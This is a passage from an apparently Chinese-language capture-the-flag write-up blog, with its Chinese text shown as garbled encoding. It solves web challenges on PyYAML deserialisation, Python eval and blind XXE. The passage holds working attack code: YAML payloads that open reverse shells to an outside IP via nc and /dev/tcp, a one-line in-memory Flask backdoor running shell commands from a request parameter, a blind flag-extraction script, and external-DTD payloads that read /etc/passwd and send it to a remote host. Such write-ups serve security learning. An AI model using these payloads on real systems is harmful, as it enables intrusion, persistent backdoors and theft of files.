</span></span><span class="line"><span class="cl">    <span class="n">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># å®‰å…¨è¿‡æ»¤</span>
</span></span><span class="line"><span class="cl">        <span class="n">black_list</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;system&#34;</span><span class="p">,</span> <span class="s2">&#34;popen&#34;</span><span class="p">,</span> <span class="s2">&#34;run&#34;</span><span class="p">,</span> <span class="s2">&#34;os&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">forbidden</span> <span class="ow">in</span> <span class="n">black_list</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">forbidden</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&#34;result&#34;</span><span class="p">:</span> <span class="s2">&#34;error&#34;</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># æ³¨æ„ï¼šyaml.load å­˜åœ¨ååºåˆ—åŒ–å®‰å…¨é£é™©</span>
</span></span><span class="line"><span class="cl">        <span class="n">yaml</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">Loader</span><span class="o">=</span><span class="n">yaml</span><span class="o">.</span><span class="n">Loader</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&#34;result&#34;</span><span class="p">:</span> <span class="s2">&#34;ok&#34;</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="n">except</span> <span class="n">Exception</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&#34;result&#34;</span><span class="p">:</span> <span class="s2">&#34;error&#34;</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ==================== ä¸»ç¨‹åº ====================</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8000</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="n">False</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>é™¤äº†çœ‹åˆ°è¿‡çš„mysqlç›¸å…³å’Œæ ¹ï¼Œè¿˜æœ‰ä¸€ä¸ª/uneed1tè·¯ç”±ã€‚è¿™é‡Œè—äº†ä¸€ä¸ªyamlååºåˆ—åŒ–</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">@</span><span class="n">app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/uneed1t&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">uneed1t</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;YAML æ•°æ®å¤„ç†æ¥å£ï¼ˆå­˜åœ¨å®‰å…¨é£é™©ï¼‰&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;data&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&#34;result&#34;</span><span class="p">:</span> <span class="s2">&#34;null&#34;</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># å®‰å…¨è¿‡æ»¤</span>
</span></span><span class="line"><span class="cl">        <span class="n">black_list</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;system&#34;</span><span class="p">,</span> <span class="s2">&#34;popen&#34;</span><span class="p">,</span> <span class="s2">&#34;run&#34;</span><span class="p">,</span> <span class="s2">&#34;os&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">forbidden</span> <span class="ow">in</span> <span class="n">black_list</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">forbidden</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&#34;result&#34;</span><span class="p">:</span> <span class="s2">&#34;error&#34;</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># æ³¨æ„ï¼šyaml.load å­˜åœ¨ååºåˆ—åŒ–å®‰å…¨é£é™©</span>
</span></span><span class="line"><span class="cl">        <span class="n">yaml</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">Loader</span><span class="o">=</span><span class="n">yaml</span><span class="o">.</span><span class="n">Loader</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&#34;result&#34;</span><span class="p">:</span> <span class="s2">&#34;ok&#34;</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="n">except</span> <span class="n">Exception</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&#34;result&#34;</span><span class="p">:</span> <span class="s2">&#34;error&#34;</span><span class="p">})</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æœ‰ä¸€ç‚¹é»‘åå•çš„yamlååºåˆ—åŒ–</p>
<p>å¡ä¸€ç¯‡æ–‡ç« <a class="link" href="https://xz.aliyun.com/news/7518"  target="_blank" rel="noopener"
    >æµ…è°ˆPyYAMLååºåˆ—åŒ–æ¼æ´-å…ˆçŸ¥ç¤¾åŒº</a></p>
<p>å¼¹ä¸ªshell</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib.parse</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ç›®æ ‡URL</span>
</span></span><span class="line"><span class="cl"><span class="n">target_url</span> <span class="o">=</span> <span class="s2">&#34;http://challenge.ilovectf.cn:30023/uneed1t&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ç®€å•çš„YAMLååºåˆ—åŒ–åˆ©ç”¨ä»£ç </span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;!!python/object/apply:subprocess.call [[&#39;/bin/busybox&#39;,&#39;nc&#39;,&#39;8.148.66.159&#39;,&#39;10726&#39;,&#39;-e&#39;,&#39;/bin/sh&#39;]]
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># URLç¼–ç payload</span>
</span></span><span class="line"><span class="cl"><span class="n">encoded_payload</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å‘é€è¯·æ±‚</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">target_url</span><span class="si">}</span><span class="s2">?data=</span><span class="si">{</span><span class="n">encoded_payload</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;çŠ¶æ€ç : </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;å“åº”: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#è®°å½•ä¸€äº›åå¼¹shellçš„payload</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2"># 1. ä½¿ç”¨ /bin/nc (æœ€å¸¸è§çš„ netcat)
</span></span></span><span class="line"><span class="cl"><span class="s2">payload1 = &#34;&#34;&#34;</span><span class="err">!!</span><span class="n">python</span><span class="o">/</span><span class="nb">object</span><span class="o">/</span><span class="n">apply</span><span class="p">:</span><span class="n">subprocess</span><span class="o">.</span><span class="n">call</span>
</span></span><span class="line"><span class="cl"><span class="p">[[</span><span class="s1">&#39;/bin/nc&#39;</span><span class="p">,</span><span class="s1">&#39;8.148.66.159&#39;</span><span class="p">,</span><span class="s1">&#39;10726&#39;</span><span class="p">,</span><span class="s1">&#39;-e&#39;</span><span class="p">,</span><span class="s1">&#39;/bin/bash&#39;</span><span class="p">]]</span><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2"># 3. ä½¿ç”¨ /bin/bash ç›´æ¥åå¼¹
</span></span></span><span class="line"><span class="cl"><span class="s2">payload3 = &#34;&#34;&#34;</span><span class="err">!!</span><span class="n">python</span><span class="o">/</span><span class="nb">object</span><span class="o">/</span><span class="n">apply</span><span class="p">:</span><span class="n">subprocess</span><span class="o">.</span><span class="n">call</span>
</span></span><span class="line"><span class="cl"><span class="p">[[</span><span class="s1">&#39;/bin/bash&#39;</span><span class="p">,</span><span class="s1">&#39;-c&#39;</span><span class="p">,</span><span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/8.148.66.159/10726 0&gt;&amp;1&#39;</span><span class="p">]]</span><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2"># 4. ä½¿ç”¨ /bin/sh åå¼¹
</span></span></span><span class="line"><span class="cl"><span class="s2">payload4 = &#34;&#34;&#34;</span><span class="err">!!</span><span class="n">python</span><span class="o">/</span><span class="nb">object</span><span class="o">/</span><span class="n">apply</span><span class="p">:</span><span class="n">subprocess</span><span class="o">.</span><span class="n">call</span>
</span></span><span class="line"><span class="cl"><span class="p">[[</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">,</span><span class="s1">&#39;-c&#39;</span><span class="p">,</span><span class="s1">&#39;sh -i &gt;&amp; /dev/tcp/8.148.66.159/10726 0&gt;&amp;1&#39;</span><span class="p">]]</span><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/qctf2025/image-20251115114834876.png"
	width="546"
	height="473"
	srcset="/p/qctf2025/image-20251115114834876_hu14372444794758096033.png 480w, /p/qctf2025/image-20251115114834876_hu13437014432001221054.png 1024w"
	loading="lazy"
	
		alt="image-20251115114834876"
	
	
		class="gallery-image" 
		data-flex-grow="115"
		data-flex-basis="277px"
	
></p>
<h3 id="è¿™åˆæ˜¯ä»€ä¹ˆå‡½æ•°">è¿™åˆæ˜¯ä»€ä¹ˆå‡½æ•°ï¼Ÿ
</h3><h4 id="çŸ¥è¯†ç‚¹pythonå†…å­˜é©¬--ç›²æ³¨">çŸ¥è¯†ç‚¹ï¼špythonå†…å­˜é©¬ || ç›²æ³¨
</h4><p>/srcå¯ä»¥çœ‹åˆ°æºç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span><span class="n">request</span><span class="p">,</span><span class="n">render_template</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/doit&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">doit</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">e</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;e&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">eval</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;done!&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;error!&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/src&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">src</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="vm">__file__</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span><span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç®€å•æºç ï¼Œå¤§å¤§åœ°éš¾</p>
<p>é‡ç‚¹æ˜¯evalï¼Œä½†æ˜¯æ­¤evaléå½¼evalï¼Œphpçš„evalåˆ©ç”¨èµ·æ¥å¾ˆèˆ’æœï¼Œä½†è¿™æ˜¯python</p>
<p>æœ¬æ¥å¯ä»¥åå¼¹shellçš„ï¼Œä½†è¿™é‡Œä¸å‡ºç½‘ã€‚</p>
<p>ä¸å‡ºç½‘å°±ä¸¤ä¸ªæ–¹æ³•ï¼Œç›²æ³¨å’Œå†…å­˜é©¬ã€‚è¿™é‡Œè¯¦ç»†è®²ä¸€ä¸‹å†…å­˜é©¬ï¼Œå› ä¸ºæˆ‘è‡ªå·±å†™çš„æ—¶å€™ä¹Ÿæƒ³è¿‡å†…å­˜é©¬ï¼Œä½†æ˜¯å¤±è´¥äº†</p>
<p>åæ¥å‘ç°å°±æ˜¯payloadæœ‰é—®é¢˜ï¼Œè¿™é‡Œç›´æ¥å°±æ˜¯æ‰“pickleååºåˆ—åŒ–çš„å†…å®¹å°±å¥½ï¼Œå› ä¸ºç›´æ¥æ˜¯evalåŒ…è£¹çš„</p>
<p><img src="/p/qctf2025/image-20251115134711354.png"
	width="1706"
	height="535"
	srcset="/p/qctf2025/image-20251115134711354_hu11683126990324026655.png 480w, /p/qctf2025/image-20251115134711354_hu16355426360360373289.png 1024w"
	loading="lazy"
	
		alt="image-20251115134711354"
	
	
		class="gallery-image" 
		data-flex-grow="318"
		data-flex-basis="765px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import__(&#39;sys&#39;).modules[&#39;__main__&#39;].__dict__[&#39;app&#39;].after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#39;shell&#39;) and exec(&#34;global CmdResp;CmdResp=__import__(&#39;flask&#39;).make_response(__import__(&#39;os&#39;).popen(request.args.get(&#39;cmd&#39;)).read())&#34;)==None else resp)
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™ä¸ªå†…å­˜é©¬å°±æ˜¯å½“ä½ ä¸ä¼ shellè¿™ä¸ªå‚æ•°æ—¶ï¼Œdotiè·¯ç”±å°±æ˜¯æ­£å¸¸çš„ï¼Œä½†æ˜¯å½“ä½ ä¼ äº†shellå‚æ•°ï¼Œé‚£ä¹ˆdoitè¿™ä¸ªè·¯ç”±å°±ä¼šå˜æˆä½ çš„åé—¨</p>
<p><img src="/p/qctf2025/image-20251115134107890.png"
	width="1299"
	height="820"
	srcset="/p/qctf2025/image-20251115134107890_hu8207764096753855097.png 480w, /p/qctf2025/image-20251115134107890_hu9074666643270950963.png 1024w"
	loading="lazy"
	
		alt="image-20251115134107890"
	
	
		class="gallery-image" 
		data-flex-grow="158"
		data-flex-basis="380px"
	
></p>
<p>ç›²æ³¨å°±ä¸å¤šè¯´äº†ï¼Œè´´ä¸€ä¸ªpayload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http:&#34;</span><span class="c1">#question-ctf-internal-test-challenge.ilovectf.cn:30865/doit&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">chars</span> <span class="o">=</span> <span class="s2">&#34;_-</span><span class="si">{}</span><span class="s2">!abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">50</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">chars</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="s1">&#39;e&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;&#34;%import&#34;%(&#34;os&#34;).system(&#34;&#34;) if open(&#34;/flag&#34;).read()[</span><span class="si">{</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="si">}</span><span class="s1">] == &#34;</span><span class="si">{</span><span class="n">c</span><span class="si">}</span><span class="s1">&#34; else 1/0&#39;</span>
</span></span><span class="line"><span class="cl"> 		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="s2">&#34;done!&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">			<span class="n">flag</span> <span class="o">+=</span> <span class="n">c</span>
</span></span><span class="line"><span class="cl">			<span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="k">break</span>
</span></span><span class="line"><span class="cl">	<span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="k">break</span> <span class="c1"># æœªæ‰¾åˆ°å­—ç¬¦ï¼Œå¯èƒ½ flag å·²ç»“æŸ</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Final flag:&#34;</span><span class="p">,</span> <span class="n">flag</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="æŸ¥æŸ¥å¿†">æŸ¥æŸ¥å¿†
</h3><h4 id="çŸ¥è¯†ç‚¹å¤–éƒ¨æ³¨å…¥dtdwaf-xxe">çŸ¥è¯†ç‚¹ï¼šå¤–éƒ¨æ³¨å…¥dtd+waf XXE
</h4><p>æ­£å¥½xeeåšå®¢é‡Œæ— å›æ˜¾xxeæ²¡å†™å®Œï¼Œè¿™é‡Œå°±å½“è¡¥å……äº†</p>
<p>æºä»£ç é‡Œ</p>
<p>é¦–å…ˆæ˜¯è¿‡æ»¤äº†ä¸€äº›ä¼ªåè®®çš„å­—ç¬¦ï¼Œè¿˜banäº†<code>&lt;!ENTITY</code>ï¼Œå‰é¢å¯ä»¥é€šè¿‡å¤–éƒ¨æ³¨å…¥dtdç»•è¿‡ï¼Œä¹Ÿå°±æ˜¯æ— å›æ˜¾çš„æ‰“æ³•ï¼Œåé¢è¿™ä¸ªå¯ä»¥ç”¨ç¼–ç ç»•è¿‡ã€‚å› ä¸ºxmlæ˜¯å¯ä»¥æŒ‡å®šç¼–ç æ ¼å¼çš„ï¼Œæˆ‘ä»¬æ”¹æˆUTF-7ï¼Œå°±å¯ä»¥ç»•è¿‡äº†</p>
<p>ä½†æ˜¯æˆ‘ä»¬å¦‚ä½•æ‰èƒ½é€šè¿‡å¤–éƒ¨æ³¨å…¥dtdå‘¢ï¼Ÿ</p>
<p><a class="link" href="https://www.freebuf.com/articles/web/332937.html"  target="_blank" rel="noopener"
    >æµ…ææ— å›æ˜¾çš„XXEï¼ˆBlind XXEï¼‰ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p>
<p>é¦–å…ˆæˆ‘ä»¬åœ¨è™šæ‹Ÿæœºä¸Šæä¸€ä¸ªxxe.dtdæ–‡ä»¶ï¼Œå†…å®¹ä¸º</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;!ENTITY % file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=file:&#34;//etc/passwd&#34;&gt;
</span></span><span class="line"><span class="cl">&lt;!ENTITY % code &#34;&lt;!ENTITY &amp;#x25 send SYSTEM &#39;http://vps:port/xxe.dtd&#39;&gt;&#34;&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>å› ä¸ºæ˜¯å¤–éƒ¨dtdè®¿é—®ï¼Œä½ éœ€è¦è®©ä½ çš„dtdèƒ½å¤Ÿè¢«å…¬ç½‘è®¿é—®åˆ°ï¼Œä¹Ÿå¾ˆç®€å•ï¼Œæå‡ºæˆ‘ä»¬çš„è€æœ‹å‹Cpolar</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;!ENTITY % file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=file:&#34;//etc/passwd&#34;&gt;
</span></span><span class="line"><span class="cl">&lt;!ENTITY % code &#34;&lt;!ENTITY &amp;#x25 send SYSTEM &#39;http://8.148.66.159:10726/xxe.dtd&#39;&gt;&#34;&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œéœ€è¦å¼€ä¸¤ä¸ªç©¿é€ï¼Œç¬¬ä¸€ä¸ªæ˜¯ç”¨pythonå¯ä¸€ä¸ªhttpæœåŠ¡ï¼Œç„¶åå†…ç½‘ç©¿é€ä¼ å‡ºå»ã€‚ç„¶åæ˜¯ä½ çš„dtdæ–‡ä»¶é‡Œç¬¬äºŒè¡Œçš„ç½‘å€ï¼Œä¹Ÿéœ€è¦ä½ å†…ç½‘ç©¿é€å‡ºå»</p>
<p>ç„¶åéœ€è¦æpayloadäº†</p>
<div class="highlight"><div class="chroma">
